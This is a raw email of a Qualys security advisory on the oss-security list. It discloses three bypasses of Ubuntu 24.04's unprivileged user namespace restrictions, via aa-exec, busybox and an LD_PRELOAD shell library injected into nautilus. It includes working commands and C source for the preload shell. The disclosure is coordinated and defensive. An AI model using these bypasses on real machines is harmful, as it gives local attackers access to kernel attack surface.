Received: (qmail 19699 invoked by uid 550); 27 Mar 2025 17:44:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 19650 invoked from network); 27 Mar 2025 17:44:31 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=
	content-id:content-transfer-encoding:content-type:date:from
	:message-id:mime-version:subject:to; s=qualyscom; bh=9/tDdHRuc9e
	kXmK/5UDWQKoIHuhR62TGJjHvlMAiFCc=; b=3GZXFBea4DQRXMQ+Cb2+/cG3QHU
	0z2GdVhLkczpTopscijMT0xLvMudf2LfFl3ULWEuk+LiMzqOh+KBBWfU+GIBEZU6
	GUuA/43c+gdy1cRfgvX1B2dC75zII8FtzIRQD6Pbd/UamhGD8o+V6nR4pdic0oj4
	DpRYCeKTHhaHlmo2WaB3ZdL15iau87HHJ/YW8MkmW9WHVJEce2S4uoYcrQSmw4ZB
	MDLgNZ46Er9KR5Ll10O0ioIOM5i9NHun3EcPWiZcBQ4lJzzt+60iBRwBYMz9/aoI
	UtQmPETZ/9PLarUQMQqhMdkhLfciNfn+SkA08KA2BTBDQj0DdNlRizE4JQg==
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=LkHIF8PA8VK5/ud8BSIltpG3UYyNp1tjOAEOC4LvGFAWUa86AJ9dJPpBRTxCAhZewwV1UP7C3t0ZEZBhlCyn+MQ7iDh+3oLDaYJvOh1dLcIQV8ecJa4Cvh9WNZTk+q0T7ehxUbLealFSnwL1Y1b6WqmCKTx8E9l9t4EAsLr+52uKqQq21zX7M3BGWP4oQoYAXfll9jzwl21R5gBTAOFGxvmRBlZmQZuh/s/HDtQDQutRufSSC9SF7pTjHdAb+egf32cblaml3zhgmzMdXpOPdQyLEvoaQYsAf/lFnLiwlXJJau40iqXbQ/HSkWxqYYZSt5INXk0dIYROGHM7i8onAw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=9/tDdHRuc9ekXmK/5UDWQKoIHuhR62TGJjHvlMAiFCc=;
 b=u0J/bYRBklg9EiN0/qYk4aXpN/CMcYUijpQsWUJHIgB7mGr8IkUBCOnaXLPM0nW9tK+3mJ+i/lXu21xGxrztXYqJZ0ab18cBQXrIycBh6eara2P4cYr/SLOf+WIpuLWdNG3k4OJSUYTQpv9M7WqXD0Qkj+HGZ7spoPUn3awXEUj3wrCE7z3kA2tODINxGQriR7dTkBSqA/8PJY+TvHK7MMnMKUMeCIT6xxbdC59Tn0zR+42iymddBuln6CZ6HPGSlJcmF9dqECkSQHQuWeF+YuKBMQ+pV0aBikvzGLs/hoxt6YeABXhMHWU+pzw1IkCULTHtJXdcoY4nHs21OIDTDQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=9/tDdHRuc9ekXmK/5UDWQKoIHuhR62TGJjHvlMAiFCc=;
 b=QXV3kj2DL74Uf8VPLGr887hVKBah9HlBn7ph0cB5HUqx5GC4zc4D5dfxtTzXMG0qe6Sj2eCgANoY9Yw3h+tSpEC+7bbQxLmtv2nqgo8hu5W0ZLWCW9SweHEO0NvmdaYFJ+nYxgadpMHuwHqpS6um1qfSHe3A+zaEYwbhBnUnPq8Fjd1CsdJxd3ob3JhwB3mqump3nZPCyqHODt9CDoXIyCJniJa/4KTfGBLxFjnhT/42rvd4zkkt9z10k7ldZpRqCLyWkpkSCCike3y9O5g5c4J7MzwqJktrvPXPZOe0BFyz8EqtKr4YMxbOcDfsBVHez3jMx1L7hW4E5fC+k/5z2Q==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: Three bypasses of Ubuntu's unprivileged user namespace
 restrictions
Thread-Index: AQHbnz/bT69u0+SUy02NAI00fE31Lg==
Date: Thu, 27 Mar 2025 17:44:15 +0000
Message-ID: <20250327174336.GA24497@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: SJ0PR06MB6910:EE_|LV8PR06MB10012:EE_
x-ms-office365-filtering-correlation-id: fbcdc660-610f-4bdc-0375-08dd6d56fe50
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;ARA:13230040|1800799024|376014|366016|38070700018;
x-microsoft-antispam-message-info:
 =?us-ascii?Q?yBmEFWDW3VMDfNo8Ft4l8QfgNNAlQOIwDor72FF2VoCclHvyi+lWctdRZTic?=
 =?us-ascii?Q?5Fbk3yQ1szW9oUBR0B1ns8WdSQlSFP9jOQbaWaweTUSfS6qntdzmhwhBSlNZ?=
 =?us-ascii?Q?kSjqWtObw8mjf+DPqpnkV1ql4BKxGgGkY1UN841sjjFjhBj1Qj9i83Q9cvGy?=
 =?us-ascii?Q?o19tpzDIthQ3r6pxMTv8faSURmAmxUs86zuevDh1TW1jOTo2BY6EI9lMK3yS?=
 =?us-ascii?Q?MhrvOV1ZHlWZ1xGiLtHUCe7sT+T3VeL/aaZ82telUP3aLJw0kJD8bT1F+Xij?=
 =?us-ascii?Q?L8ytVibZfAZAz11IuRAnasl8fNlGGTESLf5WxKoriOkG+sq0fGyT0dgpVbyf?=
 =?us-ascii?Q?2GFbOOwhY5OjIG+ZGP4GItVzVmgnC1ZYo+9F31owsvITQV2yAtHgXswqiTxT?=
 =?us-ascii?Q?dNZJEwe3cmISORmBQCpLZnW6L8bjlrNvv8lPQGZcKnsjUwQR3qCxj2jNc5Ft?=
 =?us-ascii?Q?YBn8jScRh5CaIm4ZFSkdytQY228zWVtRAk6iZ2YyALAmRvSkHc2/pHtXYiSN?=
 =?us-ascii?Q?rBLS3MoXyxS6KlU14Tfe7Wz5quV21A4GP9Awh5/yrsAX6u9PVWEu0ZI1pcE1?=
 =?us-ascii?Q?3xxirnkDG7ajsxcgf3wzlN45C54K4Ghz09nECXgDpaWuyJHZKnOjiqlr6Fa9?=
 =?us-ascii?Q?MmUDYdgewX7uIz6P2ShLFzRJJCvqOaYG8UJlc6BiEykRGKvnXmA5YHgQjoSU?=
 =?us-ascii?Q?H167Vs12MMOQPuSrpyRCzqwZfeiE1i9iMGDDJe+piGmA88SMsqdsvpkd9+1Z?=
 =?us-ascii?Q?59+xyitaiUiK3Br5iX7TaUF8jGOJpshTgJJ9UOesFRA2PeodSyDciLc0eyZ4?=
 =?us-ascii?Q?k+vq1Q5KjrqS1biF8OZQTWRu6YB6l8HMsNJO2slWMK/lGWQSqGClQ9PdsxqJ?=
 =?us-ascii?Q?fnoZmC3XPLKf5ZCJk/xzmievuxU0FbYKZVuNdZGwaIvvhY225C+tt2xUjsrN?=
 =?us-ascii?Q?ypenVNt0+DMJERfxM9QFgx25X+3xh995tUjcLe2JYOBioqEL+pvyJsHncgrt?=
 =?us-ascii?Q?UOEt/0tH+xo9PhMfuU6LszxlDBX8I12lT6Y4E5OpUPpVq2Bq0vfSMTSvBH6w?=
 =?us-ascii?Q?R0yVbkPJ3gO9vSGjbJvGqH1JQYeSk0MhDN3jclo3FFKMSIkIz4bZAJmC14OD?=
 =?us-ascii?Q?uBgpSk3TmmXSkk+DoZ1lGLJDbLf781WONciOtK/jJocMybTpixbKU/oXcPVe?=
 =?us-ascii?Q?KNJDvVnybr9UaUF3KOB7IyOiIuaZA0uwvB4aIVNtvHbD+NkTN+xvRkZd1/E8?=
 =?us-ascii?Q?fwnIfR0bAKLJTXV2QdT2xwqLCxVf4J9aPooDGXEAjvHuBUf1JRAgIx++EnmC?=
 =?us-ascii?Q?TF871fq4GpF9JEMBvouxG3qLqXjnb2HeEgGRpOgNHqoounwSy8vQTl079DIm?=
 =?us-ascii?Q?J5OQC2/qGdn774jgZDIli77YlGir?=
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(376014)(366016)(38070700018);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?PC/RUk2J+4ZlhhNWdxwN4YsPbTH4oYBwXH73v2jd4v9atupW6cv1NFbk/sMn?=
 =?us-ascii?Q?Y/K1KtIPap74a9oakJwt6+JhkI055y2igl9RcC3Nqj+IoezRyPgYdGwST80/?=
 =?us-ascii?Q?AM9TIQIqRSY2QI4HopzMiGS21SyfiY9p3navxU/G00PgCvsNBmxKtVOYdSHF?=
 =?us-ascii?Q?vmEnOET5h14q3Z6ufqEOs0FKBq1q5XE+o+gjevWkayTYOKKjBtzYbyT7fXGq?=
 =?us-ascii?Q?DZH2vOOXkwLfwCzH1b/DKFlJn9UV9Ky9WKiDu2JTnBd60YVrtcwMFUAKcmRl?=
 =?us-ascii?Q?GK8FoIRVT7AqvWL3e0c05cBSIl2ofV6DN47ze/zkDzCPc5lR2vjyusJBkjC5?=
 =?us-ascii?Q?7Xv3MyOrP7NrkUb75mn1zOgzXj45P9A5pPCw/e/F0zF6tx/kv+6ozxDlYs2p?=
 =?us-ascii?Q?3WLurpmbNsdrsiL12NZcy6ewDs21xGu3SRfAdDpYpsfZgmAGDhzRUFwuAU15?=
 =?us-ascii?Q?G2VWXmKWbmSpIBhb1re7CwRkr8Oy4barMHULw8qf17jFUMoWTbBR9obOT+rp?=
 =?us-ascii?Q?//IeVXOCVv8r+WFXe3QiZ3HuJbH4ovExRAF2jA3nDDOa4wiNS4gnz/wuKDDI?=
 =?us-ascii?Q?WeNG01foLRaZesYL6g7HFEyafG9g/HX7L3zsa8l3984naWu3E2cGcnQqh8Bq?=
 =?us-ascii?Q?vaipP6MCSXnlOhwriNgTcqgnuuSfV/jWF9x8OtCQr2I7Q+xzyO9KniqGP+GE?=
 =?us-ascii?Q?I18ICsA2ZIrzMuUDW1BsRUl7a1L69PBX+xBF76oJEq1RYeiyFwkyxGdvCob9?=
 =?us-ascii?Q?7jxt0dDuV9Qxw/FBqeHJt+wK/OAmOcx46QuR3FB6kMeA8rJZppvEHOEO5Wd6?=
 =?us-ascii?Q?J4rv7B8vFGZ0nZ1IJKrl9WzWIT4hBwc+55UxR7zXE0CYsS9b6MOFfWuyapNP?=
 =?us-ascii?Q?F21wBKRnRU9P3HKduevgR3wafPuDSdxaY1vgkUIZL8HpmKOy1MqmuIG92phl?=
 =?us-ascii?Q?0U6V4Mtk14kH6nTbF2bHWOBIPCs/a4U5h+4Kv4yKawJepmganKhdRowxl3XW?=
 =?us-ascii?Q?d6GEiQ5uqEyqSHLChz4MoDeXPXzGJp89zNB7dylNUPoAGrlecQiFUbk7HVMo?=
 =?us-ascii?Q?OR5K6czEr3n2ubORTx0OrkteB2Yndo2eNkOQcCd8LZaSQIPWjIv1LmTfUF4m?=
 =?us-ascii?Q?+3J2E9D/UZ+5a2U6IaAZ5KyMr9Qlch1s7E4uJ7SqLeQs9aJ/JZpShXTyN5Jz?=
 =?us-ascii?Q?5p2WSe461Fqn21GoTrLSrNYndhs16Jge/s1f6TKY+u23Qco+p7T/OL0AnFID?=
 =?us-ascii?Q?NHVJ/N32s+Gk5UN3sONJkhKMEZLNe3y01eyYLBr475dMflexSzlquJ33uxvx?=
 =?us-ascii?Q?GEkskoHgOkqJ/CUbf9Hg/EUYhaniREpHP2w/w3+x4T3BSh7vgCyweglwEFyx?=
 =?us-ascii?Q?EVHFb1fjVukDPCI6VOsslx0HK45MoXtfK7jhDvDi6QAo8hbakBBsiy55wB1W?=
 =?us-ascii?Q?tzoBquA2vcskUSIaJFh+15g9C9BgpHC923f/DZH8ofz2BhoNa6nyM7fAlwOw?=
 =?us-ascii?Q?KM1wPLIG/fIFrXVn8F/LNlTiJoOHWg6FecL7UQk+Pfi1DucEkvFtpNpELfcK?=
 =?us-ascii?Q?e44vmKVLTuUv4E7RXJwYkMwao+k1SeCPDAblwtg9v8Od3RXZxY5dLb662CuL?=
 =?us-ascii?Q?zNWed04eG+gU1beGFPA0gcY=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <1D72CBEC11BA7C48AFAE2B77D6BD8BE3@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: fbcdc660-610f-4bdc-0375-08dd6d56fe50
X-MS-Exchange-CrossTenant-originalarrivaltime: 27 Mar 2025 17:44:15.7382
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: p7g/pyCohl4526eRWvoUPJ2VoBUxoah6Y1l/eJU3jqWztlVLdPa6Q7lFKzdXp9ofzT6S9ms1Et9gAV6SJZ/GrphWjciincv8TfIa0BAaa1w=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: LV8PR06MB10012
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.293,Aquarius:18.0.1095,Hydra:6.0.680,FMLib:17.12.68.34
 definitions=2025-03-27_03,2025-03-26_02,2024-11-22_01
Subject: [oss-security] Three bypasses of Ubuntu's unprivileged user namespace restrictions


Qualys Security Advisory

Three bypasses of Ubuntu's unprivileged user namespace restrictions


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Summary
Bypass via aa-exec
Bypass via busybox
Bypass via LD_PRELOAD
Acknowledgments
Timeline (advisory sent to the Ubuntu Security Team on January 15, 2025)


------------------------------------------------------------------------
  Prologue, from https://grsecurity.net/10_years_of_linux_security.pdf:

    + February 2013 (v3.8) - Unprivileged User Namespace support added
      - Greatly increased kernel attack surface, exposed many interfaces
        that previously saw little security scrutiny

    + Attack surface exposed by unprivileged user namespaces isn't
      decreasing anytime soon
      - Even more functionality being exposed
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Ubuntu 23.10 introduced unprivileged user namespace restrictions (the
sysctl kernel.apparmor_restrict_unprivileged_userns) and Ubuntu 24.04
enabled them by default. From Alex Murray's excellent blog post at
https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts:

  "Unprivileged user namespaces are a widely used feature of the Linux
  kernel, providing additional security isolation for applications, and
  are often employed as part of a sandbox environment. However, [...]
  unprivileged user namespaces also expose additional attack surfaces
  within the Linux kernel. There has been a long history of (ab)use of
  unprivileged user namespaces to exploit various kernel
  vulnerabilities.

  For Ubuntu 24.04 LTS, the use of unprivileged user namespaces is then
  allowed for all applications but access to any additional permissions
  within the namespace are denied. This allows more applications to more
  gracefully handle this default restriction whilst still protecting
  against the abuse of user namespaces to gain access to additional
  attack surfaces within the Linux kernel."

Unfortunately, we discovered three different bypasses of these
unprivileged user namespace restrictions; each bypass allows a local
attacker to create user namespaces with full administrator capabilities,
and therefore to still exploit vulnerabilities in kernel components that
require capabilities such as CAP_SYS_ADMIN or CAP_NET_ADMIN:

- An unprivileged local attacker can simply use the aa-exec tool (which
  is installed by default on Ubuntu) to transition to one of the many
  pre-configured AppArmor profiles that do allow the creation of user
  namespaces with full capabilities (for example, the chrome, flatpak,
  or trinity profile).

- An unprivileged local attacker can first execute a busybox shell,
  which is installed by default on Ubuntu, and is one of the programs
  whose pre-configured AppArmor profile does allow the creation of user
  namespaces with full capabilities.

- An unprivileged local attacker can LD_PRELOAD a shell into one of the
  programs whose pre-configured AppArmor profile does allow the creation
  of user namespaces with full capabilities (for example, nautilus is
  installed by default on Ubuntu Desktop).

Clarification: such a bypass allows an unprivileged user to obtain full
capabilities *inside* a namespace, not on the host outside a namespace;
for comparison, a bypass is not even needed on most Linux distributions,
because they allow unprivileged users to obtain full capabilities inside
namespaces by default (and therefore to exploit CAP_SYS_ADMIN kernel
vulnerabilities for example), without any restriction at all.

For more information on these bypasses and user namespace restrictions,
please refer to Ubuntu's post at:

  https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-rest=
riction


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Bypass via aa-exec
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Are we all just algorithms doing what we're supposed to do or can we
    escape our programming?
        -- Jude, The Matrix Resurrections

While working on needrestart, particularly on commit e17b564 ("core: fix
regression of false positives for processes running in chroot or mountns
(#317)"), we tried to experiment with user and mount namespaces, but to
our great surprise we were barred from creating them as an unprivileged
user on Ubuntu 24.04 (although kernel.unprivileged_userns_clone is
enabled by default):

------------------------------------------------------------------------
$ id
uid=3D1001(tiffany) gid=3D1001(tiffany) groups=3D1001(tiffany),100(users)

$ unshare -U -r -m /bin/sh
unshare: write failed /proc/self/uid_map: Operation not permitted
------------------------------------------------------------------------

This error message looked very suspicious to us, so we decided to try
the userns_child_exec tool (from man user_namespaces) instead of the
pre-installed unshare tool:

------------------------------------------------------------------------
$ ./userns_child_exec -U -z -m /bin/sh

# id
uid=3D0(root) gid=3D0(root) groups=3D0(root),65534(nogroup)

# mount --bind /etc/passwd /etc/passwd
mount: /etc/passwd: bind /etc/passwd failed.
       dmesg(1) may have more information after failed mount system call.
------------------------------------------------------------------------

This time we were able to create a user and mount namespace, but to our
growing surprise we were barred from using any administrator capability
inside this namespace (our mount command failed). Puzzled, we eventually
found out that these restrictions were introduced in Ubuntu 23.10, and
enabled by default in Ubuntu 24.04, to prevent unprivileged local
attackers from exploiting kernel vulnerabilities that require
capabilities (CAP_SYS_ADMIN, CAP_NET_ADMIN, etc):

  https://discourse.ubuntu.com/t/spec-unprivileged-user-namespace-restricti=
ons-via-apparmor-in-ubuntu-23-10

To bypass these restrictions, we immediately tried to run unshare
through aa-exec, to transition to one of Ubuntu's many AppArmor profiles
that do allow the creation of user namespaces with full capabilities;
for example, the trinity profile:

------------------------------------------------------------------------
$ grep userns /etc/apparmor.d/trinity
  userns,

$ aa-exec -p trinity -- unshare -U -r -m /bin/sh

# mount --bind /etc/passwd /etc/passwd

# mount
...
/dev/sda2 on /etc/passwd type ext4 (rw,relatime)
------------------------------------------------------------------------

At last, we were able to create a user namespace with full capabilities
(our mount command succeeded). We later noticed that a quick fix to this
particular bypass was already mentioned on Ubuntu's excellent security
podcast in October 2023, but unfortunately it was never enabled by
default; from https://ubuntusecuritypodcast.org/episode-211/:

  "From a defensive security point of view, also is useful to enable an
  additional sysctl to ensure that anything which is unconfined can't
  just abuse these profiles by aa-exec'ing themselves via that profile -
  so then also need to enable the
  kernel.apparmor_restrict_unprivileged_unconfined =3D 1 sysctl too"


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Bypass via busybox
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    I'm living inside a computer-generated reality that has imprisoned
    me... again.
        -- Thomas, The Matrix Resurrections

Let us now suppose that our bypass via aa-exec is fixed (i.e.,
kernel.apparmor_restrict_unprivileged_unconfined is enabled): can we
find another way to bypass Ubuntu's unprivileged user namespace
restrictions?

The only program that is installed by default on both Ubuntu Server and
Ubuntu Desktop, and whose pre-configured AppArmor profile does allow the
creation of user namespaces with full capabilities, is busybox.

We therefore simply tried to execute unshare through busybox's built-in
shell, and lo and behold, we were again able to create a user namespace
with full capabilities (our mount command succeeded):

------------------------------------------------------------------------
$ grep userns /etc/apparmor.d/busybox
  userns,

$ busybox sh

~ $ /usr/bin/unshare -U -r -m /bin/sh

# mount --bind /etc/passwd /etc/passwd

# mount
...
/dev/sda2 on /etc/passwd type ext4 (rw,relatime)
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Bypass via LD_PRELOAD
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    You're going to imprison me after I just got free?
        -- Neo, The Matrix Resurrections

Let us now suppose that our bypasses via aa-exec and busybox are both
fixed: can we find another way to bypass Ubuntu's unprivileged user
namespace restrictions?

Besides busybox, the only other program that is installed by default on
Ubuntu Desktop, and whose pre-configured AppArmor profile does allow the
creation of user namespaces with full capabilities, is nautilus.

Although nautilus may or may not provide a shell functionality like
busybox, we can actually take a more general approach: we can simply
LD_PRELOAD a small library into nautilus, which then executes a shell.
And again, we are able to create a user namespace with full capabilities
(our mount command succeeds):

------------------------------------------------------------------------
$ grep userns /etc/apparmor.d/nautilus
  userns,

$ cat > shell.c << "EOF"
#include <unistd.h>
static void __attribute__ ((constructor)) _init (void) {
    static char * const argv[] =3D { "/bin/sh", NULL };
    static char * const envp[] =3D { NULL };
    execve(*argv, argv, envp);
    _exit(__LINE__);
}
EOF

$ gcc -fpic -shared -o shell.so shell.c

$ LD_PRELOAD=3D./shell.so /usr/bin/nautilus

$ unshare -U -r -m /bin/sh

# mount --bind /etc/passwd /etc/passwd

# mount
...
/dev/sda2 on /etc/passwd type ext4 (rw,relatime)
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We thank the Ubuntu Security Team for their work on this coordinated
release.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2025-01-15: We sent our advisory to the Ubuntu Security Team.

2025-03-21: We noticed that @roddux (on X/Twitter) independently
discovered and published the busybox bypass.

2025-03-27: Coordinated release.
